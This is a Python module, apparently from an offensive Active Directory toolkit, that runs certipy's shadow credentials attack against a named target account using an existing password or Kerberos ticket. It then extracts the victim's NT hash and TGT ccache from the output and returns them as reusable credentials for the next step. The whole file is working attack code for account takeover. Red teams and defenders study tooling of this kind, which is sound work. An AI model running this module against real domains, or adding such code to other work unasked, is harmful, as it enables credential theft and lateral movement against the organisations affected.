import subprocess
from pathlib import Path
import os


def run(data, cred, args):
    """
    Shadow credentials via certipy

    Supports:
        - password auth
        - kerberos auth (-k -no-pass)

    Returns:
        list of creds or None
    """

    extra = getattr(args, "extra", []) or []

    # -------------------------
    # Input
    # -------------------------
    if len(extra) < 1:
        print("[-] Missing target user")
        return None

    target_user = extra[0]

    ip = data.get("ip")
    domain = data.get("domain")
    hostname = data.get("hostname") or data.get("name")

    if not ip or not domain:
        print("[-] Missing IP or Domain")
        return None

    if not hostname:
        print("[-] Missing hostname (needed for Kerberos)")
        return None

    # -------------------------
    # Credential
    # -------------------------
    if not cred:
        print("[-] No active credential")
        return None

    username = cred.get("user")

    if not username:
        print("[-] Missing username")
        return None

    # -------------------------
    # Build base command
    # -------------------------
    cmd = [
        "certipy", "shadow", "auto",
        "-u", f"{username}@{domain}",
        "-account", target_user,
        "-target", f"{hostname}.{domain}"
    ]

    # -------------------------
    # Auth mode
    # -------------------------
    if cred.get("type") == "password":
        password = cred.get("secret")

        if not password:
            print("[-] Missing password")
            return None

        cmd += ["-p", password]

    elif cred.get("type") == "ticket" or cred.get("ccache"):
        ccache = cred.get("ccache") or os.environ.get("KRB5CCNAME")

        if not ccache:
            print("[-] No ccache found for Kerberos")
            return None

        # set env for certipy
        os.environ["KRB5CCNAME"] = ccache

        cmd += ["-k", "-no-pass"]

        print("[*] Using Kerberos authentication")

    else:
        print("[-] Unsupported credential type")
        return None

    print(f"[*] Running: {' '.join(cmd)}")

    # -------------------------
    # Execute
    # -------------------------
    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True
        )
    except Exception as e:
        print(f"[-] Execution failed: {e}")
        return None

    output = result.stdout + result.stderr
    print(output)

    # -------------------------
    # Parse NTLM hash
    # -------------------------
    ntlm_hash = None

    for line in output.splitlines():
        if "NT hash for" in line:
            parts = line.split(":")

            # Ensure we actually have a hash part
            if len(parts) >= 2:
                candidate = parts[-1].strip()

                # basic sanity check (32 hex chars)
                if len(candidate) == 32 and all(c in "0123456789abcdefABCDEF" for c in candidate):
                    ntlm_hash = candidate
                    break

    # -------------------------
    # Find ccache
    # -------------------------
    ccache_files = list(Path(".").glob("*.ccache"))
    latest_ccache = None

    if ccache_files:
        latest_ccache = max(ccache_files, key=lambda f: f.stat().st_mtime)
        print(f"[+] Got TGT: {latest_ccache.name}")

    # -------------------------
    # Build result
    # -------------------------
    results = []

    if ntlm_hash:
        print(f"[+] Got NTLM: {ntlm_hash}")
        results.append({
            "user": target_user,
            "type": "hash",
            "hash": ntlm_hash
        })

    if latest_ccache:
        results.append({
            "user": target_user,
            "type": "ticket",
            "ccache": str(latest_ccache)
        })

    if not results:
        print("[-] No usable output")
        return None

    return results